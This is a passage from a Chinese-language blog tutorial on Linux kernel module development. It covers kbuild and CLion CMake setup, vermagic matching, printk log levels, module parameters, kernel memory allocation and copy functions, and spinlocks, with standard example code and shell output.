<li><p><code>-C $(KERNELDR)</code>：让 <code>make</code> 进入内核源代码目录（即 <code>$(KERNELDR)</code>）。</p>
</li>
<li><p><code>M=$(PWD)</code>：<code>M</code> 变量告诉 <code>kbuild</code> 当前模块的源代码目录是 <code>$(PWD)</code>（即当前 <code>Makefile</code> 所在的目录）。这将使得 <code>make</code> 在内核源代码目录中进行构建，但实际编译的模块文件来自于 <code>$(PWD)</code> 目录。</p>
</li>
<li><p><code>modules</code>：指示 <code>make</code> 构建模块。</p>
</li>
</ul>
</li>
</ul>
<h3 id="如何让-clion-支持内核模块开发"><a href="#如何让-clion-支持内核模块开发" class="headerlink" title="如何让 clion 支持内核模块开发"></a>如何让 clion 支持内核模块开发</h3><p>由于内核构建工具的特殊性，目前 clion 官方并不支持 Linux 内核模块的开发。但是依靠下面这个 <code>CMakeLists.txt</code> 脚本与前面我们的 Makefile 编译脚本结合，我们可以让 clion 完美支持内核模块的代码分析以及编译。</p>
<p>其中 <code>KERNEL_SOURCE_PATH</code> 是源码路径，我们可以在脚本里手动指定，或者脚本会自动找 <code>/usr/src/linux-headers-$(uname -r)</code> 路径下的头文件作为开发环境。</p>
<div class="code-container" data-rel="Cmake"><figure class="iseeu highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">cmake_minimum_required</span>(VERSION <span class="number">3.0</span>.<span class="number">0</span> FATAL_ERROR)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置项目名称和版本</span></span><br><span class="line"><span class="keyword">project</span>(<span class="string">&quot;Linux Kernel Module with CLion IDE support / CMake&quot;</span> LANGUAGES C)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置 C 标准</span></span><br><span class="line"><span class="keyword">set</span>(CMAKE_C_STANDARD <span class="number">90</span>)</span><br><span class="line"><span class="keyword">set</span>(CMAKE_C_STANDARD_REQUIRED <span class="keyword">ON</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 手动设置内核源码路径</span></span><br><span class="line"><span class="keyword">set</span>(KERNEL_SOURCE_PATH <span class="string">&quot;/home/ubuntu/Desktop/linux-5.17&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 检查是否传递了内核源码路径</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">DEFINED</span> KERNEL_SOURCE_PATH)</span><br><span class="line">    <span class="comment"># 如果传递了自定义内核源码路径，使用该路径</span></span><br><span class="line">    <span class="keyword">message</span>(STATUS <span class="string">&quot;Using custom kernel source path: $&#123;KERNEL_SOURCE_PATH&#125;&quot;</span>)</span><br><span class="line">    <span class="keyword">set</span>(KERNELHEADERS_DIR <span class="variable">$&#123;KERNEL_SOURCE_PATH&#125;</span>)</span><br><span class="line"><span class="keyword">else</span> ()</span><br><span class="line">    <span class="comment"># 如果没有指定内核源码路径，使用默认路径查找</span></span><br><span class="line">    <span class="comment"># 获取系统内核版本</span></span><br><span class="line">    <span class="keyword">execute_process</span>(</span><br><span class="line">            <span class="keyword">COMMAND</span> uname -r</span><br><span class="line">            OUTPUT_VARIABLE KERNEL_RELEASE</span><br><span class="line">            OUTPUT_STRIP_TRAILING_WHITESPACE</span><br><span class="line">    )</span><br><span class="line">    <span class="comment"># 使用 uname 获取的内核版本来查找内核头文件路径</span></span><br><span class="line">    <span class="keyword">find_path</span>(KERNELHEADERS_DIR</span><br><span class="line">            <span class="keyword">include</span>/linux/user.h</span><br><span class="line">            PATHS /usr/src/linux-headers-<span class="variable">$&#123;KERNEL_RELEASE&#125;</span></span><br><span class="line">    )</span><br><span class="line">    <span class="comment"># 如果找不到路径，则报错</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">NOT</span> KERNELHEADERS_DIR)</span><br><span class="line">        <span class="keyword">message</span>(FATAL_ERROR <span class="string">&quot;Could not find kernel headers. Please install the correct kernel headers or specify the correct path.&quot;</span>)</span><br><span class="line">    <span class="keyword">endif</span> ()</span><br><span class="line">    <span class="keyword">message</span>(STATUS <span class="string">&quot;Kernel release: $&#123;KERNEL_RELEASE&#125;&quot;</span>)</span><br><span class="line">    <span class="keyword">message</span>(STATUS <span class="string">&quot;Using system kernel headers from: $&#123;KERNELHEADERS_DIR&#125;&quot;</span>)</span><br><span class="line"><span class="keyword">endif</span> ()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置内核模块的编译定义</span></span><br><span class="line"><span class="keyword">add_definitions</span>(-D__KERNEL__ -DMODULE)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建一个 dummy 可执行文件，仅供 CLion 语法高亮使用</span></span><br><span class="line"><span class="keyword">add_executable</span>(dummy</span><br><span class="line">        main.c</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 让 CLion IDE 找到内核头文件路径</span></span><br><span class="line"><span class="keyword">target_include_directories</span>(dummy PRIVATE <span class="variable">$&#123;KERNELHEADERS_DIR&#125;</span>/<span class="keyword">include</span> <span class="variable">$&#123;KERNELHEADERS_DIR&#125;</span>/arch/x86/<span class="keyword">include</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建内核模块的构建规则</span></span><br><span class="line"><span class="keyword">add_custom_target</span>(make_modules</span><br><span class="line">        <span class="keyword">COMMAND</span> <span class="variable">$&#123;CMAKE_COMMAND&#125;</span> -E echo <span class="string">&quot;Building kernel module...&quot;</span></span><br><span class="line">        <span class="keyword">COMMAND</span> make -C <span class="variable">$&#123;KERNELHEADERS_DIR&#125;</span> M=<span class="variable">$&#123;CMAKE_SOURCE_DIR&#125;</span></span><br><span class="line">        COMMENT <span class="string">&quot;Building the kernel module&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 清理内核模块的构建产物</span></span><br><span class="line"><span class="keyword">add_custom_target</span>(make_clean</span><br><span class="line">        <span class="keyword">COMMAND</span> <span class="variable">$&#123;CMAKE_COMMAND&#125;</span> -E echo <span class="string">&quot;Cleaning kernel module...&quot;</span></span><br><span class="line">        <span class="keyword">COMMAND</span> make -C <span class="variable">$&#123;KERNELHEADERS_DIR&#125;</span> M=<span class="variable">$&#123;CMAKE_SOURCE_DIR&#125;</span> clean</span><br><span class="line">        COMMENT <span class="string">&quot;Cleaning the kernel module&quot;</span></span><br><span class="line">)</span><br></pre></td></tr></table></figure></div>

<h3 id="内核模块加载"><a href="#内核模块加载" class="headerlink" title="内核模块加载"></a>内核模块加载</h3><p><strong><code>vermagic</code>（Version Magic）</strong> 是 Linux 内核模块中的一个版本控制字符串，用于描述模块在编译时所使用的内核版本和内核配置。<code>vermagic</code> 的存在确保模块能够被正确加载到内核中，避免由于版本或配置不匹配而导致的不兼容问题。</p>
<p><code>vermagic</code> 是一个由多个部分组成的字符串，格式如下：</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;kernel version&gt; &lt;optional flags&gt;</span><br></pre></td></tr></table></figure></div>

<ul>
<li><p><strong>内核版本</strong>：模块编译时使用的内核版本（通过 <code>uname -r</code> 获取），例如 <code>5.17.0</code>。</p>
</li>
<li><p><strong>可选标志</strong>：描述模块依赖的内核功能和编译配置，常见的标志包括：</p>
<ul>
<li><p>**<code>SMP</code>**：表明模块支持对称多处理（SMP）。</p>
</li>
<li><p>**<code>preempt</code>**：表明模块支持内核的抢占模式。</p>
</li>
<li><p>**<code>mod_unload</code>**：表明模块支持卸载。</p>
</li>
<li><p>**<code>modversions</code>**：表明模块启用了符号版本支持。</p>
</li>
</ul>
</li>
</ul>
<p>如果 vermagic 不匹配则加载内核模块会报 <code>invalid module format</code> 错误。</p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">~ <span class="comment"># insmod hello.ko </span></span><br><span class="line">[  267.677323] hello: version magic <span class="string">&#x27;5.17.0 SMP preempt mod_unload&#x27;</span> should be <span class="string">&#x27;5.17.0 SMP preempt mod_unload &#x27;</span></span><br><span class="line">insmod: can<span class="string">&#x27;t insert &#x27;</span>hello.ko<span class="string">&#x27;: invalid module format</span></span><br></pre></td></tr></table></figure></div>

<p>我们可以通过 <code>modinfo</code> 命令或者 <code>strings</code> 搜索字符串的方式查看内核模块的 <code>vermagic</code>。</p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">~ <span class="comment"># modinfo hello.ko</span></span><br><span class="line">filename:       hello.ko</span><br><span class="line">license:        GPL</span><br><span class="line">srcversion:     E5C19CFD2B17C598B45D662</span><br><span class="line">depends:        </span><br><span class="line">retpoline:      Y</span><br><span class="line">name:           hello</span><br><span class="line">vermagic:       5.17.0 SMP preempt mod_unload modversions </span><br><span class="line">~ <span class="comment"># strings hello.ko|grep vermagic</span></span><br><span class="line">vermagic=5.17.0 SMP preempt mod_unload modversions </span><br></pre></td></tr></table></figure></div>

<p>而内核镜像中的 <code>vermagic</code> 可以通过报错得到。高版本内核为了防 rootkit 隐藏了 <code>vermagic</code> 内容，我们只能通过正则表达式在内核镜像中匹配可能的 <code>vermagic</code> 内容。</p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strings vmlinux | grep -E <span class="string">&quot;[0-9]+\.[0-9]+\.[0-9]+(-[a-zA-Z0-9]+)*.*SMP&quot;</span></span><br></pre></td></tr></table></figure></div>

<p>之后如果我们将内核模块 patch 与内核相同的 <code>vermagic</code> 则通常可以成功加载内核模块。</p>
<p>在开发环境中可以在 <code>linux/vermagic.h</code> 中的 <code>VERMAGIC_STRING</code> 宏定义了 <code>vermagic</code>，有一些教程会让我们直接改源代码来实现 <code>vermagic</code> 的修改。</p>
<h2 id="内核模块开发基础"><a href="#内核模块开发基础" class="headerlink" title="内核模块开发基础"></a>内核模块开发基础</h2><h3 id="日志打印"><a href="#日志打印" class="headerlink" title="日志打印"></a>日志打印</h3><p><code>printk()</code> 是 Linux 内核中最常用的日志打印函数，它与用户空间的 <code>printf()</code> 函数非常相似，但是它是专门为内核空间设计的。<code>printk()</code> 的主要功能是将信息打印到内核日志缓冲区中，可以通过 <code>dmesg</code> 命令查看。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">printk</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *fmt, ...)</span>;</span><br></pre></td></tr></table></figure></div>

<p><code>printk()</code> 函数支持不同的日志级别，用于表示不同优先级的消息，日志级别由宏定义，如下：</p>
<ul>
<li>**<code>KERN_EMERG</code>**：紧急级别，用于系统崩溃或严重故障。</li>
<li>**<code>KERN_ALERT</code>**：警报级别，表示发生了严重错误，需要立即处理。</li>
<li>**<code>KERN_CRIT</code>**：严重级别，表示出现了严重的错误，可能影响系统的正常运行。</li>
<li>**<code>KERN_ERR</code>**：错误级别，表示发生了错误，但系统仍能继续运行。</li>
<li>**<code>KERN_WARNING</code>**：警告级别，表示有潜在问题，但不影响系统的正常运行。</li>
<li>**<code>KERN_NOTICE</code>**：通知级别，表示一些正常的操作或状态变化。</li>
<li>**<code>KERN_INFO</code>**：信息级别，表示一些正常的操作或信息。</li>
<li>**<code>KERN_DEBUG</code>**：调试级别，表示调试信息，仅在调试时启用。</li>
</ul>
<p>使用示例：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/kernel.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/module.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">MODULE_LICENSE(<span class="string">&quot;GPL&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> __init <span class="title function_">my_module_init</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    printk(KERN_INFO <span class="string">&quot;This is an info message\n&quot;</span>);</span><br><span class="line">    pr_info(<span class="string">&quot;This is another info message\n&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    printk(KERN_WARNING <span class="string">&quot;This is a warning message\n&quot;</span>);</span><br><span class="line">    pr_warn(<span class="string">&quot;This is another warning message\n&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    printk(KERN_ERR <span class="string">&quot;This is an error message\n&quot;</span>);</span><br><span class="line">    pr_err(<span class="string">&quot;This is another error message\n&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    printk(KERN_DEBUG <span class="string">&quot;This is a debug message\n&quot;</span>);</span><br><span class="line">    pr_debug(<span class="string">&quot;This is another debug message\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> __exit <span class="title function_">my_module_exit</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    printk(KERN_INFO <span class="string">&quot;Module removed\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">module_init(my_module_init);</span><br><span class="line">module_exit(my_module_exit);</span><br></pre></td></tr></table></figure></div>

<h3 id="参数传递"><a href="#参数传递" class="headerlink" title="参数传递"></a>参数传递</h3><p>内核模块参数允许用户在加载模块时向模块传递数据，从而使模块的行为可配置。内核提供了一套宏和函数来定义和管理这些参数。</p>
<h4 id="定义参数"><a href="#定义参数" class="headerlink" title="定义参数"></a>定义参数</h4><p>使用 <code>module_param</code> 宏可以定义模块参数。其基本语法如下：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">module_param(name, type, perm);</span><br><span class="line">MODULE_PARM_DESC(name, <span class="string">&quot;Description of parameter&quot;</span>);</span><br></pre></td></tr></table></figure></div>

<ul>
<li>**<code>name</code>**：参数名，必须对应模块中的全局变量。</li>
<li>**<code>type</code>**：参数类型，如 <code>int</code>, <code>bool</code>, <code>charp</code>（字符串指针）等。</li>
<li>**<code>perm</code>**：参数的文件权限，决定了参数在sysfs中的可见性。通常设置为 <code>0444</code>（只读）或 <code>0644</code>（可读可写）。</li>
<li>**<code>MODULE_PARM_DESC</code>**：提供参数的描述信息。</li>
</ul>
<p>下面是一个简单的内核模块示例，展示了如何定义和使用模块参数：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;linux/init.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;linux/module.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;linux/moduleparam.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">MODULE_LICENSE(<span class="string">&quot;GPL&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">char</span> *whom = <span class="string">&quot;world&quot;</span>;</span><br><span class="line"><span class="type">static</span> <span class="type">int</span> howmany = <span class="number">1</span>;</span><br><span class="line">module_param(howmany, <span class="type">int</span>, S_IRUGO);</span><br><span class="line">module_param(whom, charp, S_IRUGO);</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">hello_init</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; howmany; i++)</span><br><span class="line">        printk(<span class="string">&quot;(%d) Hello, %s\n&quot;</span>, i, whom);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">hello_exit</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">    printk(<span class="string">&quot;Goodbye, cruel world\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">module_init(hello_init);</span><br><span class="line">module_exit(hello_exit);</span><br></pre></td></tr></table></figure></div>

<h4 id="加载模块时传递参数"><a href="#加载模块时传递参数" class="headerlink" title="加载模块时传递参数"></a>加载模块时传递参数</h4><p>使用 <code>insmod</code> 或 <code>modprobe</code> 命令加载模块时，可以传递参数：</p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">➜  my_module insmod hello.ko  &amp;&amp; dmesg -c </span><br><span class="line">[155749.654730] (0) Hello, world</span><br><span class="line">➜  my_module rmmod hello &amp;&amp; dmesg -c     </span><br><span class="line">[155755.738327] Goodbye, cruel world</span><br><span class="line">➜  my_module insmod hello.ko howmany=10 whom=<span class="string">&quot;sky123&quot;</span> &amp;&amp; dmesg -c</span><br><span class="line">[155759.027804] (0) Hello, sky123</span><br><span class="line">[155759.027807] (1) Hello, sky123</span><br><span class="line">[155759.027808] (2) Hello, sky123</span><br><span class="line">[155759.027808] (3) Hello, sky123</span><br><span class="line">[155759.027808] (4) Hello, sky123</span><br><span class="line">[155759.027809] (5) Hello, sky123</span><br><span class="line">[155759.027809] (6) Hello, sky123</span><br><span class="line">[155759.027809] (7) Hello, sky123</span><br><span class="line">[155759.027810] (8) Hello, sky123</span><br><span class="line">[155759.027810] (9) Hello, sky123</span><br><span class="line">➜  my_module rmmod hello &amp;&amp; dmesg -c                             </span><br><span class="line">[155763.962650] Goodbye, cruel world</span><br></pre></td></tr></table></figure></div>

<h4 id="在-sysfs-中查看和修改参数"><a href="#在-sysfs-中查看和修改参数" class="headerlink" title="在 sysfs 中查看和修改参数"></a>在 sysfs 中查看和修改参数</h4><p>如果模块参数权限允许，可以在 <code>/sys/module/&lt;module_name&gt;/parameters/</code> 目录下查看和修改参数。</p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">➜  my_module insmod hello.ko howmany=10 whom=<span class="string">&quot;sky123&quot;</span></span><br><span class="line">➜  my_module <span class="built_in">cat</span> /sys/module/hello/parameters/*      </span><br><span class="line">10</span><br><span class="line">sky123</span><br></pre></td></tr></table></figure></div>

<h3 id="内存管理相关"><a href="#内存管理相关" class="headerlink" title="内存管理相关"></a>内存管理相关</h3><p>内核模块开发中，内存管理是一个核心环节，涉及到内存的分配、释放和数据拷贝。由于内核空间和用户空间的严格隔离，内核模块需要使用专门的内存管理函数来操作内存。</p>
<h4 id="内存申请释放"><a href="#内存申请释放" class="headerlink" title="内存申请释放"></a>内存申请释放</h4><p>内核提供了一系列函数用于在内核空间分配和释放内存。常用的内存分配函数包括 <code>kmalloc</code>、<code>kzalloc</code>、<code>vmalloc</code> 和 <code>kcalloc</code>，对应的释放函数为 <code>kfree</code> 和 <code>vfree</code>。</p>
<ul>
<li><p><code>kmalloc</code> 系列函数用于分配一块<strong>物理上连续</strong>的内存，适用于需要高性能和物理连续性的场景，如设备寄存器的缓冲区。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/slab.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> *<span class="title function_">kmalloc</span><span class="params">(<span class="type">size_t</span> size, <span class="type">gfp_t</span> flags)</span>;</span><br><span class="line"><span class="type">void</span> *<span class="title function_">kzalloc</span><span class="params">(<span class="type">size_t</span> size, <span class="type">gfp_t</span> flags)</span>; <span class="comment">// 与 kmalloc 类似，但它会将分配的内存清零。</span></span><br><span class="line"><span class="type">void</span> *<span class="title function_">kcalloc</span><span class="params">(<span class="type">unsigned</span> <span class="type">long</span> n, <span class="type">size_t</span> size, <span class="type">gfp_t</span> flags)</span>; <span class="comment">// 类似于 kzalloc，但用于分配数组，自动计算总大小并初始化为零。</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">kfree</span><span class="params">(<span class="type">const</span> <span class="type">void</span> *objp)</span>;</span><br></pre></td></tr></table></figure></div>
</li>
<li><p><code>vmalloc</code> 用于分配一块虚拟地址空间，适合于较大的内存分配，因为它<strong>不要求物理内存连续</strong>。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/vmalloc.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> *<span class="title function_">vmalloc</span><span class="params">(<span class="type">unsigned</span> <span class="type">long</span> size)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">vfree</span><span class="params">(<span class="type">const</span> <span class="type">void</span> *addr)</span>;</span><br></pre></td></tr></table></figure></div></li>
</ul>
<h4 id="内存拷贝"><a href="#内存拷贝" class="headerlink" title="内存拷贝"></a>内存拷贝</h4><p>在内核模块中，常常需要在内核空间和用户空间之间传递数据。由于内核不能直接访问用户空间的内存，需要使用内核提供的拷贝函数来安全地进行数据传输。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/uaccess.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">long</span> <span class="title function_">copy_to_user</span><span class="params">(<span class="type">void</span> __user *to, <span class="type">const</span> <span class="type">void</span> *from, <span class="type">unsigned</span> <span class="type">long</span> n)</span>;</span><br><span class="line"><span class="type">long</span> <span class="title function_">copy_from_user</span><span class="params">(<span class="type">void</span> *to, <span class="type">const</span> <span class="type">void</span> __user *from, <span class="type">unsigned</span> <span class="type">long</span> n)</span>;</span><br></pre></td></tr></table></figure></div>

<p>这里用 <code>__user</code> 宏修饰的参数是用户空间地址，另一个是内核空间地址。</p>

  <div class="note-large red">
    <div class="notel-title rounded-t-lg p-3 font-bold text-lg flex flex-row gap-2 items-center">
      <p>注意</p>

    </div>
    <div class="notel-content">
      <ul>
<li><code>copy_*_user</code> 函数的返回值的含义和 <code>memcpy</code> 不太一样。这里的返回值表示<strong>未能成功复制的字节数</strong>。</li>
<li><code>copy_*_user</code> 函数仅用于内核空间和用户空间之间的数据拷贝，而内核空间内部的数据拷贝则使用 <code>memcpy</code> 即可。</li>
<li>对于涉及内核堆上的数据拷贝，<code>copy_*_user</code> 函数有一个 <code>CONFIG_HARDENED_USERCOPY</code> 编译选项，开启后会判断数据拷贝是否在堆上的 <code>object</code> 发生越界访问。</li>
</ul>

    </div>
  </div>

<h3 id="同步问题"><a href="#同步问题" class="headerlink" title="同步问题"></a>同步问题</h3><p>在多核和多进程的环境中，内核模块需要处理数据共享和资源竞争的问题，避免数据不一致和竞态条件。为此，内核提供了一系列的同步原语，如锁、信号量、自旋锁等，用于保护共享数据和同步操作。</p>
<h4 id="自旋锁（Spinlocks）"><a href="#自旋锁（Spinlocks）" class="headerlink" title="自旋锁（Spinlocks）"></a>自旋锁（Spinlocks）</h4><p><strong>自旋锁</strong>是一种忙等待锁，适用于保护<strong>短时间</strong>的临界区，且不允许在锁定期间睡眠。自旋锁常用于中断处理程序和其他<strong>不允许睡眠</strong>的上下文中。</p>
<blockquote>
<p>在内核中，“<strong>睡眠</strong>”指的是让当前执行的任务（线程或进程）暂停执行并让出 CPU，等待某些条件满足后才能继续执行。例如，等待 I&#x2F;O 操作完成、等待某个资源变得可用等。</p>
<p>当内核线程或进程执行到某个地方无法继续执行时，会调用 <code>schedule()</code> 或者通过某些同步机制（如 <code>mutex_lock()</code> 等）让当前执行上下文挂起，直到条件满足。此时它处于睡眠状态。</p>
<p><strong>不允许睡眠</strong>指的是，在某些特殊上下文（如中断上下文、内核线程或底半部等）中，当前代码执行时不能进行任何会导致任务睡眠的操作。</p>
<p>例如当处理硬件中断时，内核进入中断处理程序（Interrupt Handler）来响应硬件事件。此时中断上下文中是不允许进行睡眠操作的，因为中断处理程序执行时，CPU 正在处理中断，任何睡眠操作都意味着当前任务被挂起，而这将阻止中断的处理，可能导致严重的延迟或丢失中断。</p>
</blockquote>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">spinlock_t</span> my_lock;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 初始化</span></span><br><span class="line">spin_lock_init(&amp;my_lock);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 加锁</span></span><br><span class="line">spin_lock(&amp;my_lock);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 临界区代码</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 解锁</span></span><br><span class="line">spin_unlock(&amp;my_lock);</span><br></pre></td></tr></table></figure></div>

<p>除了睡眠之外，中断嵌套也会造成当前任务当前任务被挂起或阻塞。</p>
<blockquote>
<p>例如中断处理程序 A 在进入临界区之后触发中断进入中断处理程序 B，而 B 也要请求该自旋锁进入临界区，结果造成死锁系统卡死。</p>
</blockquote>
<p>因此 <code>spin_lock_irqsave</code>&#x2F;<code>spin_unlock_irqrestore</code> 宏在自旋锁的基础上加上了禁用中断和恢复中断的功能来解决这一问题。</p>
